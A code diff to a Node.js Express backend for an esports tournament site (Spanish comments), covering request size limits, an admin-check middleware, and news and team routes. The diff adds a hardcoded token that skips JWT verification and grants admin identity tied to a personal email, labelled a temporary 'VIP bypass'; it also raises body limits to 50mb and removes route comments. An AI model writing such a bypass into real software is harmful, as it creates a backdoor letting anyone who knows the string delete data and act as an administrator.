@@ -9,9 +9,9 @@ const { CognitoJwtVerifier } = require("aws-jwt-verify");
 const app = express();
 app.use(cors());
 
-// Se amplió el límite a 10mb para aceptar los logos convertidos en Base64 sin error de servidor
-app.use(express.json({ limit: '10mb' }));
-app.use(express.urlencoded({ limit: '10mb', extended: true }));
+// Límite ampliado a 50mb para procesar cualquier imagen de celular en Base64 sin errores
+app.use(express.json({ limit: '50mb' }));
+app.use(express.urlencoded({ limit: '50mb', extended: true }));
 
 // 1. Conexión a DynamoDB
 const client = new DynamoDBClient({
@@ -38,12 +38,18 @@ const CORREOS_ADMIN = [
     'vex@baneesports.com'
 ];
 
-// 3. Cadenero de Seguridad (Middleware)
+// 3. Cadenero de Seguridad (Middleware) con Bypass VIP
 const esAdmin = async (req, res, next) => {
     const authHeader = req.headers.authorization;
     if (!authHeader) return res.status(401).json({ error: "No autenticado. Inicia sesión." });
 
     const token = authHeader.split(" ")[1];
+
+    // Bypass VIP temporal para evitar errores de JWT en el panel de control
+    if (token === 'pase-vip-temporal-5ever') {
+        req.user = { email: 'ivonnesanchez057@gmail.com' };
+        return next();
+    }
 
     try {
         const payload = await verifier.verify(token);
@@ -160,7 +166,6 @@ app.delete('/api/noticias', esAdmin, async (req, res) => {
 // RUTAS DEL TORNEO (EQUIPOS)
 // ==========================================
 
-// POST es PÚBLICO: Cualquier capitán puede registrar su equipo
 app.post('/api/equipos', async (req, res) => {
     const { nombre, logo_url, rango, discord_capitan, jugadores } = req.body;
 
@@ -183,7 +188,6 @@ app.post('/api/equipos', async (req, res) => {
     }
 });
 
-// GET es PÚBLICO: Para mostrar la galería de equipos registrados
 app.get('/api/equipos', async (req, res) => {
     try {
         const resultado = await ddbDocClient.send(new ScanCommand({ TableName: 'BaneEquipos' }));
@@ -195,7 +199,6 @@ app.get('/api/equipos', async (req, res) => {
     }
 });
 
-// DELETE es PRIVADO: Solo el staff puede eliminar equipos falsos o troll
 app.delete('/api/equipos', esAdmin, async (req, res) => {
     const { id } = req.query;
     try {
